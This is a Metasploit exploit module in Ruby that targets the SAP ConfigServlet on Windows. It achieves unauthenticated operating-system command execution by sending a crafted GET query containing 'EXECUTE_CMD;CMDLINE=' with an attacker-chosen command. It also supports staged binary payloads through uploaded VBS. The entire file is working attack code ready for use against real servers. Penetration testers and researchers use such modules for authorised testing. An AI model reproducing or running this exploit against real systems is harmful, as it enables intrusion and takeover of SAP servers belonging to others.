require 'msf/core'

class Metasploit3 < Msf::Exploit
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'SAP ConfigServlet OS Command Execution',
			'Description'     => %q{
				This module allows execution of operating system commands through
				the SAP ConfigServlet without any authentication.
			},
			'Author'          =>
				[
					'Dmitry Chastuhin', # Vulnerability discovery (based on the reference presentation)
					'Andras Kabai' # Metasploit module
				],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']
				],
			'DisclosureDate' => 'Nov 01 2012', # Based on the reference presentation
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows CMD (Use windows CMD payloads)',
						{
							'Arch' => ARCH_CMD
						}
					],
					[
						'Windows x86 (Execute binary payloads via uploaded VBS)',
						{
							'Arch' => ARCH_X86
						}
					]
				],
			'DefaultTarget'  => 0,
			'Privileged'     => false
			))

		register_options(
			[
				Opt::RPORT(50000),
				OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])
			], self.class)
	end

	def exploit
		print_status("#{rhost}:#{rport} - Exploiting remote system")
		uri = normalize_uri(target_uri.path, 'ConfigServlet')

		if target['Arch'] == ARCH_CMD
			send_evil_request(uri, payload.encoded)
		else
			execute_cmdstager( { :linemax => 1500, :nodelete => true, :sap_configservlet_uri => uri })
		end
	end

	def execute_command(cmd, opts)
		vprint_status("Attempting to execute: #{cmd}")
		send_evil_request(opts[:sap_configservlet_uri], cmd)
	end
	
	def send_evil_request(uri, cmd)
		begin
			res = send_request_cgi(
				{
					'uri' => uri,
					'method' => 'GET',
					'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text.uri_encode(cmd)
				})

			if !res or res.code != 200
				print_error("#{rhost}:#{rport} - Exploit failed.")
				fail_with(Exploit::Failure::UnexpectedReply)
			end
		rescue ::Rex::ConnectionError
			print_error("#{rhost}:#{rport} - Failed to connect to the server")
			fail_with(Exploit::Failure::Unreachable)
		end

		if res.body.include?("Process created")
			print_good("#{rhost}:#{rport} - Exploited successfully\n")
		else
			print_error("#{rhost}:#{rport} - Exploit failed.")
			vprint_error("#{rhost}:#{rport} - Output: #{res.body}")
			fail_with(Exploit::Failure::PayloadFailed)
		end
	end
end
